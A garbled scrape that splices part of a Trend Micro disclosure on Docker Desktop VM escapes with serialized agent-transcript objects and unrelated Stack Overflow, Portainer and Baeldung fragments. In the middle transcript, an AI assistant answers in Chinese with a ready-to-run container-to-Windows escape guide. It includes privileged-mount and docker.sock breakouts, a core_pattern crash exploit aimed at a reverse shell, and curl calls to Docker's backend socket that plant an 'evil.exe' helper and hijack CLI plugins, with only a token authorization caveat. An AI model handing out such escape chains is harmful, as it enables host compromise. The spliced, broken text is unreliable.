_C:\\Program Files\\Docker\\Docker\\resources\\cli-plugins\\,_ still get called by _Docker Desktop.exe_ under certain operations. \n**VM escape using Docker CLI plugins loading: app/reset**\nVM escape using Docker CLI plugins can be achieved by creating the path _C:\\Users\\\\[Username]\\\\.docker\\cli-plugins_ and copying the binaries to a certain directory, as shown in Figure 12.\n![Figure 12. Binaries copied to C:\\\\Users\\\\\\[Username\\]\\\\.docker\\\\cli-plugins](https://documents.trendmicro.com/images/uploads/figure%2012-GurlAyq.png)\nFigure 12. Binaries copied to _C:\\Users\\\\[Username]\\\\.docker\\cli-plugins_\nA simple call to the “/app/reset” endpoint in the backend Unix socket is sufficient to trigger the execution of these new binaries. The /app/reset endpoint is called with the following command:\n![](https://documents.trendmicro.com/images/uploads/Fig%2012b-qnTRj0Q.png)\nIn our demonstration, all default plugins were replaced with _calc.exe_ (Calculator). As shown in Figure 13, all the renamed _calc.exe_ plugins stored under _C:\\Users\\sec\\\\.docker\\cli-plugins\\_ were executed.\n![Figure 13. Screenshot showing the VM escape via Docker CLI plugins loading](https://documents.trendmicro.com/images/uploads/figure%2013-6SABhiP.png)\nFigure 13. Screenshot showing the VM escape via Docker CLI plugins loading\nIt’s worth noting that the plugin mechanism is very flexible, and it’s an important component of Docker Desktop. For this reason, it is expected that VM escapes can be achieved by abusing other backend APIs beyond /app/reset. \n**VM escape using Docker CLI plugins loading: module/apply-updates**\nWe also found another exposed Linux socket named Modules-Manager (_modules-manager.sock_) with the following endpoints:\n  * /modules/apply-updates\n  * /modules/reset-updates\n\n\nThe “/modules/apply-updates” endpoint also has the side effect of forcing the Docker backend service to execute the plugins. A VM escape can be achieved by updating the plugins to _C:\\Users\\__[Username]\\\\.docker\\cli-plugins_ and calling the endpoint. The following shows how to call the “/modules/apply-updates” endpoint:\n![](https://documents.trendmicro.com/images/uploads/Fig-13b-7x8a6vU.png)\n### Docker Desktop for Windows system editor uncontrolled search path element\nWe also found another backend API endpoint that has a side effect on the host side named “Editor.” Docker Desktop defines Editor as any text editor that, when installed, is recognized by Docker as a text editor, such as VSCode and Notepad. The endpoint is defined as follows:\n  * HTTP GET “/system/editor”: Fetch the current configured code editor.\n  * HTTP POST “/system/editor”: Open the current code editor on the host.\n\n\nThis API has both GET and POST versions. The POST version executes code on the host by launching the Docker Desktop–configured Editor. If the current user can control the Editor path, a VM escape can be done. Unfortunately, these API endpoints do not allow control and configuration of Editor’s executable path. For example, if a code editor is not installed on the host, the response of the GET is “no editor found.” However, Docker Desktop, by default, uses Visual Studio Code as the Editor, even if it is not installed. Sending a POST request forces Docker Desktop to launch Editor, and when VSC is not installed, Docker Desktop searches for the binary _Code.exe_ in the following order:\n  1. C:\\Windows\\System32\\\n  2. C:\\Program Files\\Docker\\Docker\\resources\\bin\\\n  3. C:\\Windows\\\n  4. C:\\Windows\\System32\\wbem\\\n  5. C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\n  6. C:\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\WindowsApps\\\n\n\nDocker Desktop uses path resolution to launch the configured Editor executable. Because one of the paths is “controlled” by the current user — specifically the sixth path — this behavior can lead to a VM escape, as shown in Figure 14. This can be achieved through the following steps:\n  1. Copy a malicious _exe_ to:  \n**C:\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\WindowsApps\\**\n  2. Send a POST request to the system editor endpoint:\n\n\n![](https://documents.trendmicro.com/images/uploads/Fig%2014b-3WYzxrH.png)\n![Figure 14. Screenshot showing how the VM escape using system editor tampering works ](https://documents.trendmicro.com/images/uploads/figure%2014-4VKuFcg.png)\nFigure 14. Screenshot showing how the VM escape using system editor tampering works\n## Conclusion and recommendations\nEven though Docker Desktop for Windows under WSL introduces another layer of isolation between containers and the host and does not allow direct code execution after a container escape, the Docker Desktop architecture is not designed to contain the VM escape. There are multiple ways to escape the VM by abusing Docker Desktop’s functionality through exposed endpoints in the VM.\nThe exposed endpoints do not allow direct code execution on the host. When combined with host-mounted drives, however, they could result in sufficient control over Docker behavior to enable VM escapes. Instead of using code execution features in Docker, which are obvious spots to monitor for malicious activities, a threat actor could utilize these techniques, taking advantage of the benign activities they log in order to stealthily gain execution on the host.\nOur findings highlight the need to reassess how developer tooling is treated within the enterprise. Docker Desktop’s internal APIs and configuration mechanisms are designed for orchestration and usability, not as hardened security boundaries. Security teams should extend visibility and governance to developer environments, and reinforce behavioral monitoring and configuration control to detect abuse of legitimate Docker workflows, rather than relying solely on blocking direct code execution.\nUsers need to be aware that although Docker has determined these privilege escalation behaviors fall outside its security threat model and thus will not be remediated, they nonetheless present potential paths for compromise, especially through malicious or tampered Docker Compose–based projects.\nBased on the techniques demonstrated in this research, defenses should address both  _pre-execution risks_ in developer workflows and  _post-escape behavior_ on development environments:\n  * [**TrendAI Vision One™ Code Security**](https://www.trendmicro.com/en/business/products/hybrid-cloud/code-security.html)**for proactive detection:** Code Security can help identify risky or malicious Docker Compose YAML files, such as suspicious images or unsafe mount directives, before they are used in development environments. Since several escape scenarios begin with manipulated Compose configurations, scanning configuration as code (CaC) and infrastructure as code (IaC) early provides a proactive layer of protection.\n  * [**TrendAI Vision One™ XDR for Endpoints**](https://www.trendmicro.com/content/dam/trendmicro/global/en/core/docs/datasheets/ds-xdr-for-endpoints.pdf)**as the final line of defense:** All VM escape techniques ultimately lead to Windows host execution after a container escape. Endpoint visibility is therefore critical. XDR for Endpoints can detect abnormal Docker Desktop activity, unexpected process launches (for example, from user-controlled plugin paths or credential helper locations), and malware behavior such as infostealer activity, credential access, or persistence actions.\n  * [**TrendAI Vision One™ Container Security**](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-container-image-security.html)**for additional hardening:** While Container Security does not directly prevent Docker Desktop–specific VM escapes, enforcing policies around allowed images, mounts, and privileges helps reduce the conditions attackers rely on to set up these techniques, adding another layer of environmental protection. \n\n\n## Appendix\nThese issues were responsibly disclosed to Docker. Docker reviewed all reported cases and acknowledged that the behaviors described can be reproduced. However, Docker ultimately determined that these scenarios fall outside its defined security threat model.\nAccording to Docker, the prerequisite step of mounting the complete Docker Desktop file system into a running container already implies that the attacker possesses privileged, system‑level access on the host. At this level of access, an adversary would inherently be able to read sensitive data, exfiltrate authentication tokens, or manipulate critical system components without relying on any Docker‑specific mechanism. Because the attack surface becomes reachable only after such a compromise, Docker concluded that the resulting VM escape behaviors do not constitute independent vulnerabilities requiring remediation.\nDocker’s assessment emphasizes that Docker Desktop’s guarantees assume an uncompromised host and do not extend to scenarios where an attacker has already achieved elevated control. While Docker does not plan to issue fixes for these cases, Docker expressed appreciation for the research and encouraged continued submissions, noting that findings of this nature may still help refine ecosystem understanding around how benign orchestration mechanisms can be repurposed once host integrity is lost.\nHIDE\n**Like it? ((('system', 'main'), ('system', 'search')), AssistantMessage(role='assistant', content='在WSL2环境下，从Docker容器访问Windows宿主机的C盘需要突破两层隔离：容器到WSL2虚拟机、再到Windows主机。以下是基于不同容器配置的逃逸方法，**请确保您有合法的授权**。\n\n## 1. 环境侦察（容器内执行）\n首先判断容器的权限和可用资源：\n```bash\n# 检查是否为特权容器\ncat /proc/self/status | grep CapEff\n# 特权容器输出：0000003fffffffff 或 0000001fffffffff\n\n# 检查Docker Socket是否挂载\nls -lah /var/run/docker.sock 2>/dev/null\n\n# 检查/proc是否被挂载（可能挂载了宿主机procfs）\nfind / -name core_pattern 2>/dev/null | head -5\n\n# 查看磁盘设备\nfdisk -l 2>/dev/null | head -20\n\n# 查看当前挂载点\nmount | grep -E \'/mnt|/host|/workspace\'\n```\n\n## 2. 根据侦察结果选择逃逸路径\n\n### 方法A：特权容器逃逸（最简单）\n如果容器以`--privileged`运行：\n```bash\n# 1. 查找宿主机磁盘（通常是/dev/sda或/dev/vda）\nfdisk -l\n\n# 2. 挂载宿主机根文件系统\nmkdir /host\nmount /dev/sda1 /host  # 根据实际情况调整设备名\n\n# 3. 访问Windows C盘\n# WSL2中Windows文件系统通常挂载在/mnt/c\nls -la /host/mnt/c/\n# 或可能路径：/host/mnt/host/c/\n\n# 4. 创建文件\ntouch /host/mnt/c/test_escape.txt\necho "Escaped from container" > /host/mnt/c/test_escape.txt\n```\n\n### 方法B：Docker Socket逃逸（最常见）\n如果`/var/run/docker.sock`存在：\n```bash\n# 1. 安装Docker客户端（如未安装）\napt-get update && apt-get install -y curl\ncurl -fsSL https://get.docker.com -o get-docker.sh\nsh get-docker.sh\n\n# 2. 创建新容器挂载宿主机根目录\ndocker run -it -v /:/host --rm ubuntu bash\n\n# 在新容器中：\nchroot /host\n# 现在已逃逸到宿主机（WSL2虚拟机）\n\n# 3. 访问Windows C盘\ncd /mnt/c\ntouch test_from_wsl.txt\n```\n\n### 方法C：procfs挂载逃逸（高级）\n如果发现挂载了宿主机`/proc`：\n```bash\n# 1. 找到容器在宿主机上的绝对路径\ncat /proc/mounts | xargs -d \',\' -n 1 | grep workdir\n\n# 2. 利用core_pattern机制（需要gcc）\ncat > /tmp/exploit.c << \'EOF\'\n#include<stdio.h>\nint main(void) {\n    int *a = NULL;\n    *a = 1;  // 触发崩溃，执行core_pattern中的脚本\n    return 0;\n}\nEOF\ngcc /tmp/exploit.c -o /tmp/exploit\n\n# 3. 编写反弹shell脚本到宿主机proc目录\n# （具体步骤参考前文Docker逃逸手法大全中的procfs逃逸部分）\n```\n\n### 方法D：WSL2直接访问（如果配置允许）\n如果容器能访问WSL2的挂载点：\n```bash\n# 尝试直接访问/mnt/c（通常不可行，除非特殊配置）\nls /mnt/c 2>/dev/null\n\n# 通过查找.socket文件尝试连接Docker Desktop API\nfind / -name "*.sock" 2>/dev/null | grep -v /proc\n# 可能找到：/run/backend.sock、/run/module-manager.sock等\n\n# 使用curl调用Docker Desktop后端API\ncurl --unix-socket /run/backend.sock http://localhost/app/settings 2>/dev/null\n```\n\n## 3. WSL2到Windows宿主机的特殊考虑\nWSL2架构中：\n- Windows文件系统通过`9p`协议挂载到`/mnt/c`（或`/mnt/host/c`）\n- Docker Desktop在WSL2虚拟机中运行，暴露多个API socket\n- 逃逸到WSL2虚拟机后，您仍需要突破虚拟机到Windows主机的隔离\n\n**最新Docker Desktop VM逃逸技术**（基于Trend Micro研究）：\n```bash\n# 前提：已获得WSL2虚拟机权限（通过上述任意方法）\n\n# 方法1：滥用credentialHelper设置\n# 在Windows用户目录放置恶意可执行文件\necho \'malicious\' > /mnt/c/Users/$(whoami)/.docker/evil.exe\n\n# 通过backend.sock修改设置并触发执行\ncurl --unix-socket /run/backend.sock -X POST \\\n  -H "Content-Type: application/json" \\\n  -d \'{"credentialHelper":"C:\\\\\\\\Users\\\\\\\\\'$(whoami)\'\\\\\\\\.docker\\\\\\\\evil.exe"}\' \\\n  http://localhost/app/settings\n\ncurl --unix-socket /run/backend.sock -X POST \\\n  http://localhost/kubernetes/start\n\n# 方法2：Docker CLI插件劫持\n# 在Windows用户目录创建恶意插件\nmkdir -p /mnt/c/Users/$(whoami)/.docker/cli-plugins/\ncp /bin/sh /mnt/c/Users/$(whoami)/.docker/cli-plugins/docker-ai.exe\n\n# 触发插件加载\ncurl --unix-socket /run/backend.sock -X POST \\\n  http://localhost/app/reset\n```\n\n## 4. 创建文件的最终步骤\n成功逃逸到Windows主机后：\n```bash\n# 通过WSL2的/mnt/c直接访问（如果已逃逸到WSL2）\ntouch /mnt/c/test_created_from_container.txt\n\n# 或通过Docker Desktop VM逃逸后\n# 文件将创建在Windows的C盘根目录\n# C:\\test_created_from_container.txt\n```\n\n## 5. 安全建议与注意事项\n1. **合法性**：仅在授权测试环境中使用\n2. **容器加固**：\n   - 避免使用`--privileged`\n   - 不挂载`/var/run/docker.sock`\n   - 使用非root用户运行容器\n   - 限制挂载目录范围\n3. **WSL2配置**：\n   - 更新Docker Desktop到最新版\n   - 限制WSL2虚拟机资源访问\n   - 使用Windows Defender应用控制\n\n## 6. 自动化检测脚本\n```bash\n#!/bin/bash\necho "=== Docker容器逃逸检测 ==="\necho "1. 特权检查:"\ncat /proc/self/status | grep CapEff | grep -q ffffffff && echo "   [✓] 特权容器" || echo "   [✗] 非特权容器"\n\necho "2. Docker Socket:"\nls /var/run/docker.sock 2>/dev/null && echo "   [✓] 存在" || echo "   [✗] 不存在"\n\necho "3. 磁盘设备:"\nfdisk -l 2>/dev/null | head -5\n\necho "4. WSL2挂载点:"\nmount | grep -E \'/mnt/c|/mnt/host\'\n\necho "5. Docker API Sockets:"\nfind /run /var/run -name "*.sock" 2>/dev/null | grep -i docker\n```\n\n选择哪种方法取决于您的具体环境配置。最简单的是特权容器逃逸，最常用的是Docker Socket逃逸，最新颖的是Docker Desktop API滥用。', tool_calls=None, reasoning_content='这篇文章详细介绍了在WSL2中 Docker Desktop 的虚拟机逃逸技术。不过，用户的问题可能更简单：他只想从容器内部访问 Windows 宿主机的 C 盘。也许不需要完整的逃逸，只需要挂载宿主机的文件系统。\n\n如果容器具有特权（privileged），就可以挂载宿主机磁盘。但用户没有说明容器是否以特权模式运行。假设没有，那么可能需要利用其他漏洞。\n\n考虑到用户提到“逃逸”，他可能已经具备了容器内的 root 权限，并希望突破隔离环境。\n\n我们需要提供一个实用的方法。首先，我们需要判断容器是否具有特权，或者是否存在 Docker socket 挂载。我们可以检查 `/var/run/docker.sock` 是否存在。如果存在，就可以使用 Docker API 创建新的容器，并挂载宿主机文件系统。\n\n另外，在 WSL2 中，宿主机文件系统可能挂载在 `/mnt/host/c` 或 `/mnt/c`。但容器内部可能看不到这个挂载点。不过，如果容器以 `-v /mnt/c:/host` 的方式挂载了宿主机目录，那就可以直接访问。\n\n但用户说只有 D 盘挂载到了 `/workspace`。那么 C 盘可能没有挂载。\n\n那么，我们需要先逃逸到 WSL2 系统，然后从那里访问 `/mnt/c`。或者，通过挂载宿主机文件系统来逃逸。\n\n我们可以参考文章中提到的方法：使用 `docker run -v /:/host` 来挂载宿主机根目录。但前提是需要有 Docker socket 的访问权限。\n\n如果容器内没有 Docker socket，我们可以尝试其他方法，比如 procfs 挂载逃逸。但这需要容器挂载了宿主的 procfs。\n\n我们需要一个逐步的指南。\n\n首先，我们需要评估容器的权限。检查以下内容：\n1. 检查是否以特权模式运行：`cat /proc/self/status | grep CapEff`。\n2. 检查 `/var/run/docker.sock` 是否存在。\n3. 检查 `/proc` 是否被挂载。\n4. 检查 `/dev` 设备。\n\n然后，根据检查结果提供相应的方法。\n\n但用户可能只需要一个具体的方法。我们可以提供多种方法，并说明它们需要的条件。\n\n现在，用中文整理一个答案。\n\n首先，介绍背景：在 WSL2 中，Docker 容器运行在 Linux 虚拟机中，Windows 文件系统通常挂载在 `/mnt/c`。但容器内部可能无法直接访问，除非挂载了该目录。\n\n然后，提供几种逃逸方法：\n\n方法1：如果容器以特权模式运行，可以挂载宿主机磁盘。\n- 使用 `fdisk -l` 识别磁盘设备（例如 `/dev/sda1`）。\n- 创建目录：`mkdir /host`。\n- 挂载：`mount /dev/sda1 /host`。\n- 然后就可以访问 `/host/mnt/c` 或类似路径。\n\n但需要注意的是，WSL2 使用的可能是 `/dev/sdd` 或其他设备。我们可以通过 `mount` 命令查看现有挂载点。\n\n方法2：如果挂载了 Docker socket，可以使用 Docker API 创建新容器并挂载宿主机文件系统。\n- 在容器内安装 Docker 客户端。\n- 使用 `docker run -v /:/host -it ubuntu bash` 创建新容器。\n- 然后通过 `chroot /host` 逃逸。\n\n方法3：利用 procfs 挂载逃逸（如果挂载了 `/proc`）。\n- 参考之前文章中的方法。\n\n方法4：利用 Docker Desktop 的 API（如果暴露了后端套接字）。\n- 但这可能比较复杂。\n\n方法5：如果容器内可以访问 WSL2 的文件系统，也许可以尝试访问 `/mnt/c`，但这可能需要挂载宿主机的文件系统。\n\n另外，我们还需要考虑如何在逃逸后创建文件。例如，在宿主机 C 盘创建文件：`touch /host/mnt/c/test.txt`。\n\n但需要注意的是，WSL2 中 Windows 文件系统的挂载点可能是 `/mnt/c`。在宿主机根目录挂载后，路径可能是 `/host/mnt/c`。\n\n然而，在 WSL2 中，宿主机文件系统是通过 `9p` 挂载的，挂载点可能是 `/mnt/host/c`。这取决于 Docker Desktop 的版本。\n\n我们可以通过检查 `/mnt` 目录下的内容来确定。\n\n另外，用户提到“只有 D 盘挂载到 /workspace”。这可能意味着容器启动时使用了 `-v /d:/workspace` 参数。那么 C ((('system', 'main'), ('system', 'search')), AssistantMessage(role='assistant', content='', tool_calls=[{'index': 0, 'id': 'call_00_jZpAFhOTJxUalZexxVAkfkO8', 'type': 'function', 'function': {'name': 'web_search', 'arguments': '{"key_words": "WSL2 docker container access Windows C drive SMB mount"}'}}], reasoning_content='用户想知道在WSL2 Docker容器中，如何访问Windows宿主机的C盘。容器有某些能力（cap_dac_override, cap_sys_chroot, cap_mknod），但不是特权容器，也没有Docker socket。只有D盘挂载到/workspace。\n\n我需要回忆一下WSL2的架构。WSL2是一个Linux虚拟机，运行在Hyper-V之上。Windows文件系统（包括C盘）通过9P协议挂载到WSL2虚拟机内的/mnt/c目录下。但问题在于，Docker容器是在WSL2虚拟机中运行的，默认情况下，容器内可能看不到/mnt/c。因为Docker容器有自己独立的文件系统命名空间。\n\n用户提到只有D盘挂载到了容器的/workspace。这意味着宿主机的D盘通过WSL2的挂载机制，可能被传递到了容器内。但C盘没有挂载。\n\n那么，从容器内访问C盘，可能的方法有几种：\n1. 如果容器可以访问WSL2虚拟机的文件系统（比如通过挂载），那么就能访问/mnt/c。\n2. 或者，通过一些技巧，让容器挂载宿主机的C盘。这可能涉及到使用容器的能力（capabilities）来挂载设备或文件系统。\n\n用户提到容器有cap_dac_override, cap_sys_chroot, cap_mknod等能力。cap_dac_override可以忽略文件权限检查，cap_sys_chroot允许使用chroot，cap_mknod允许创建设备节点。这些能力可能有助于挂载操作。\n\n我需要思考具体步骤。首先，容器需要能够访问WSL2虚拟机内的/mnt/c。但容器可能没有这个目录。也许可以通过挂载宿主机的文件系统到容器内。由于容器在WSL2虚拟机中运行，而WSL2虚拟机已经将Windows C盘挂载在/mnt/c，那么容器需要能够看到这个挂载点。\n\n在Docker中，可以使用`-v`或`--mount`将宿主目录挂载到容器内。但用户说只有D盘挂载到/workspace。所以，可能需要在容器内尝试挂载C盘。\n\n但容器如何挂载C盘呢？在Linux中，挂载通常需要root权限或相应的capabilities。用户有cap_sys_chroot和cap_mknod，但挂载还需要cap_sys_admin。用户没有提到cap_sys_admin。不过，也许可以通过其他方式。\n\n或许可以利用WSL2的特性：在WSL2中，可以通过`/mnt/c`访问C盘。如果容器能够突破命名空间隔离，访问到WSL2虚拟机的根文件系统，那么就能找到/mnt/c。\n\n一种常见的技术是使用`nsenter`进入宿主机的命名空间。但容器内可能没有`nsenter`。或者，可以尝试通过`/proc`文件系统访问宿主机的文件系统。\n\n在Docker容器中，`/proc`文件系统通常只包含容器的信息，但如果有适当的挂载，也许能看到宿主机的`/proc`。用户没有提到挂载了`/proc`。\n\n也许可以尝试在容器内创建设备节点，然后挂载WSL2虚拟机的磁盘。但WSL2虚拟机通常使用虚拟磁盘（如ext4），而Windows C盘是NTFS，通过9P网络文件系统挂载到WSL2。这可能会很复杂。\n\n另一种思路：在WSL2中，可以通过`\\\\wsl$\\`网络路径访问WSL2的文件系统。但从容器内部，也许可以通过网络访问Windows宿主机的共享。\n\n或许可以在容器内安装`cifs-utils`，然后挂载Windows共享。但需要Windows主机的IP地址和凭据。\n\nWSL2提供了一个特殊的IP地址来访问Windows主机：`host.docker.internal`或`host.containers.internal`。在Docker for Windows中，容器可以通过这个主机名访问Windows主机。但用户使用的是WSL2后端，可能也是这样。\n\n那么，从容器内，也许可以通过SMB协议挂载Windows的C盘。需要Windows主机的IP。在WSL2中，Windows主机的IP通常位于`/etc/resolv.conf`中的nameserver，或者是固定的`172.17.0.1`？实际上，在Docker for Windows with WSL2中，容器可以通过`host.docker.internal`访问Windows主机。\n\n让我搜索一下。使用搜索工具。'))

it is useful and clear\n0 \nSave this question.\n[](https://stackoverflow.com/posts/67900684/timeline)\nShow activity on this post.\nFrom Windows, I can access the file systems of all the WSL containers from under `\\\\wsl$`.\nAnd from inside a WSL container, I can access the windows `C:\\` drive as `/mnt/c`.\nBut how can I access another container\'s drive from inside a WSL container?\nI\'m trying to access `\\\\wsl$\\othercontainer\\some\\file` from inside a WSL container.\n`wslpath` can normally convert Windows file paths to paths accessible from WSL:\n\n```\nWSL2@~» wslpath \'C:\\Windows\\System32\\drivers\\etc\\hosts\'\n/mnt/c/Windows/System32/drivers/etc/hosts\n\n```\n\nBut it doesn\'t work for:\n\n```\nWSL2@~» wslpath \'\\\\wsl$\\othercontainer\\some\\file\'\nwslpath: \\\\wsl$\\othercontainer\\some\\file\n\nWSL2@~» echo $?\n1\n\n```\n\nAnd of course:\n\n```\nWSL2@~» ls -l \'\\\\wsl$\\othercontainer\\some\\file\'\nls: cannot access \'\\\\wsl$\\othercontainer\\some\\file\': No such file or directory\n\n```\n\n  * [windows-subsystem-for-linux](https://stackoverflow.com/questions/tagged/windows-subsystem-for-linux "show questions tagged \'windows-subsystem-for-linux\'")\n\n\n[Share](https://stackoverflow.com/q/67900684 "Short permalink to this question")\n[Improve this question](https://stackoverflow.com/posts/67900684/edit)\nFollow \nFollow this question to receive notifications\n[edited Jun 10, 2021 at 18:01](https://stackoverflow.com/posts/67900684/revisions "show all edits to this post")\nasked Jun 9, 2021 at 8:48\n[![Peter V. Socket逃逸”用户也没有。\n\n那么，也许需要利用容器的能力进行某种挂载。\n\n搜索“cap_sys_chroot escape docker container”。'))

ext4`之类的信息，那就不是绑定挂载。但如果是绑定挂载，会显示`/mnt/d on /workspace type ...`。\n\n那么，在容器内执行：\n\n```bash\nmount | grep workspace\n```\n\n如果显示`/mnt/d`，那么`/workspace`就是`/mnt/d`的绑定挂载。然后可以尝试`ls container in Docker Desktop\n5 min read\nMarch 27, 2023\nJuly 8, 2025\nLast updated: \nDecember 2, 2025\n![Neil Cresswell](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/685ddfde8f36a9682093fa39_neil-headshot.avif)\nNeil Cresswell\n,\nPortainer CEO\n[Follow on LinkedIn](https://www.linkedin.com/in/ncresswell/)\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa2b/69153e5a1d2b39bcf12da3aa_Frame%201707483513.svg)\n###### Table of Contents\n[](https://www.portainer.io/blog/docker-mount-cifs)\n[](https://www.portainer.io/blog/docker-mount-cifs)\n[](https://www.portainer.io/blog/docker-mount-cifs)\n[](https://www.portainer.io/blog/docker-mount-cifs)\n[](https://www.portainer.io/blog/docker-mount-cifs)\n[](https://www.portainer.io/blog/docker-mount-cifs)\nShare this Key takeaways\nSo I had someone ask me today, "How do i mount a remote CIFS share to a container running on Docker Desktop on Windows"... and to be honest, i had no idea... so i tested it..\nFirst problem, Docker Desktop uses an alpine based WSL2 image, and this image is missing the cifs-utils package.. this needs to be installed\nOpen the Windows command prompt, and type "wsl --distribution docker-desktop"\nYou will then get a console into the WSL2 instance.\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccbc_image-png-Mar-27-2023-11-02-44-8227-AM.png)\nThen type "apk add cifs-utils" and wait for it to install\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccc8_image-png-Mar-27-2023-11-04-00-8566-AM.png)\nNow switch back to Docker Desktop, and using the Portainer Extension, you can define a volume that maps to the CIFS share as follows:\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccc1_image-png-Mar-27-2023-11-20-00-7152-AM.avif)\nNote: substitute the IP address of your CIFS target (dont use dns name as that just adds complexity), and add in a username and password that has access to the CIFS share.\nSee the volume is created. Dont worry about the mount point location, thats just where Docker mounts the CIFS share into.\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccb3_image-png-Mar-27-2023-11-15-49-9224-AM.avif)\nNow you can add this volume to a container..\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccd4_image-png-Mar-27-2023-11-17-06-7627-AM.avif)\nThen click "deploy container"\nOnce the container is deployed, open a console into the container to validate the share..\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccb6_image-png-Mar-27-2023-11-22-00-0780-AM.avif)\nCompare against the share itself..\n![](https://cdn.prod.website-files.com/685ddfde8f36a9682093fa36/686c5b4cc63a17299c16ccb9_image-png-Mar-27-2023-11-22-28-6909-AM.avif)\nSuccess.. works perfectly.\nSo this is how you attach a CIFS share to a container inside Docker Desktop for Windows (using Portainer Extension).\nNeil\nInfrastructure Moves Fast. ((('system', 'main'), ('system', 'search')), AssistantMessage(role='assistant', content='', tool_calls=[{'index': 0, 'id': 'call_00_1o1VHbPmi5KXESEXk9XgW3Ip', 'type': 'function', 'function': {'name': 'web_search', 'arguments': '{"key_words": "cap_sys_chroot mount host filesystem docker"}'}}], reasoning_content='这篇文章讲的是如何在Docker Desktop中挂载CIFS共享，但需要访问WSL2实例并安装cifs-utils。然而，用户是在容器内部，可能无法直接访问WSL2实例。不过，容器内或许可以安装cifs-utils。\n\n那么，在容器内安装cifs-utils，然后挂载`//host.docker.internal/c$`，这可能是可行的。\n\n但需要身份验证。也许可以使用guest身份验证，或者使用当前用户的凭据。在WSL2中，可能已经有一些凭据可用。\n\n另一个想法是：在WSL2中，Windows主机可以通过特殊的IP地址访问。通常，Windows主机的IP是`172.17.0.1`或类似。在Docker for Windows中，`host.docker.internal`会解析到Windows主机的IP。\n\n那么，在容器内可以尝试：\n\n```bash\napt-get update && apt-get install -y cifs-utils\nmkdir /c\nmount -t cifs //host.docker.internal/c$ /c -o user=,password=\n```\n\n但可能需要指定用户名和密码。也许可以尝试`-o guest`。\n\n另外，也可以使用`smbclient`来测试连接。\n\n但用户可能希望在不安装额外软件的情况下完成操作。不过，容器内可能已经安装了`cifs-utils`。\n\n另一种方法：通过9p文件系统挂载。但需要知道如何挂载9p。\n\n在WSL2中，`/mnt/c`是9p挂载点。如果容器能够挂载9p文件系统，也许可以直接挂载Windows目录。\n\n但需要`cap_sys_admin`能力来挂载文件系统。用户没有这个能力。\n\n不过，用户有`cap_dac_override`和`cap_sys_chroot`。`cap_sys_chroot`允许使用`chroot`。也许可以`chroot`到宿主机文件系统，但需要先找到宿主机文件系统。\n\n也许可以通过`/proc/1/root`来访问宿主机文件系统。在容器内，`/proc/1`通常是容器的init进程。但宿主机进程可能不可见。\n\n不过，如果容器以`--pid=host`启动，就能看到宿主机进程。但用户没有提到这个。\n\n那么，我们总结一下可能的方案：\n\n1. 通过SMB挂载Windows共享（需要安装cifs-utils，可能需要身份验证）。\n2. 通过9p挂载（需要cap_sys_admin，但用户没有）。\n3. 通过chroot到宿主机文件系统（需要找到宿主机文件系统）。\n4. 通过绑定挂载访问`/mnt/c`（需要cap_sys_admin，但用户没有）。\n5. 利用Docker逃逸技术，比如通过`/proc/sys/kernel/core_pattern`（需要挂载宿主机procfs，但用户没有）。\n6. 利用capabilities进行某种逃逸。\n\n搜索“docker escape cap_sys_chroot mount”。'))

2024\n![](https://secure.gravatar.com/avatar/ec43d7a6ab2518d7f9887f2d1d6a8809bf706fda4458e333101988e7dabd1f69?s=50&r=g)\nWritten by:  [Chris Nzoka-okoye](https://www.baeldung.com/linux/author/chrisnzokaokoye "Posts by Chris Nzoka-okoye")\n![](https://secure.gravatar.com/avatar/5ea913eb2fb938e09d3cfe9447162fa35fcebe1e643967d42d7931c8b82b1165?s=50&r=g)\nReviewed by:  [ Hiks Gerganov ](https://www.baeldung.com/linux/editor/hiksgerganov "Reviewed by Hiks Gerganov")\n  * [Docker](https://www.baeldung.com/linux/category/docker)\n  * [Filesystems](https://www.baeldung.com/linux/category/filesystems)\n\n\n  * [ Docker Container ](https://www.baeldung.com/linux/tag/docker-container)\n  * [ mount ](https://www.baeldung.com/linux/tag/mount)\n\n\n## 1. Overview[](https://www.baeldung.com/linux/docker-mount-host-filesystem#overview)\nA [Docker container](https://www.baeldung.com/linux/docker-image-run-container) is a portable, lightweight, isolated environment that runs applications and their dependencies. [Mounting](https://www.baeldung.com/linux/mount-unmount-filesystems#mounting) a [filesystem](https://www.baeldung.com/linux/filesystem-guide) within a Docker container enables access to files or directories on the host system from the container. Doing so can be useful for sharing data or configurations between the container and the host.\nIn this tutorial, we’ll learn how to mount filesystems within a Docker container.\n## 2. Host Source Directory[](https://www.baeldung.com/linux/docker-mount-host-filesystem#host-source-directory)\nFirst, **to mount filesystems within a Docker container,[Docker](https://www.baeldung.com/ops/docker-guide) must be installed on the system**. Further, let’s identify a source directory on the host system, i.e., the path on the system we wish to use during the mounting process.\nTo illustrate, let’s create a new directory on our host machine with [_mkdir_](https://www.baeldung.com/linux/create-directory-permissions-with-single-command):\n\n```\n$ mkdir /home/user1/hostpathCopy\n```\n\nNext, let’s check to see that the new directory is present and verify its attributes with the [_ls_](https://www.baeldung.com/linux/list-one-filename-per-line) command:\n\n```\n$ ls -ld /home/user1/hostpath/\ndrwxrwxr-x 2 user1 user1 4096 Jul 17 04:43 /home/user1/hostpath/Copy\n```\n\nHere, the  _-l_ option enables a long listing of the directory, while the _-d_ flag ensures that we display information about the directory [filesystem object](https://www.baeldung.com/linux/inodes#filesystem-objects) and not its content.\nWith the source directory ready, let’s now run the container.\n## 3. Using Volumes[](https://www.baeldung.com/linux/docker-mount-host-filesystem#using-volumes)\n**To mount a filesystem within a Docker container, we use the _-v_ or _–volume_ flag when running the container.** Its argument consists of two fields separated by a colon (_:_):\n  * host source directory path\n  * container target directory path\n\n\nIn short, we link a directory on the host machine to a directory within the container when using _docker_ :\n\n```\n$ docker run -it --rm -v /path/on/host:/path/in/container image_name 